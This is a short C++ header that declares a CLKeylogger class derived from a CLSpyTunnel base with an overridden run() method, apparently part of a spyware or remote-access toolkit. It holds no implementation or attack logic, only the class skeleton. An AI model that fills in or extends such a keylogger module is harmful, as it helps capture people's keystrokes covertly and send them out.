#ifndef CLKEYLOGGER_HPP
#define CLKEYLOGGER_HPP

#include "cltunnel_include.hpp"
#include "clspy_tunnel.hpp"

class CLKeylogger : public CLSpyTunnel {
public:
    void run() override;
};

#endif // CLKEYLOGGER_HPP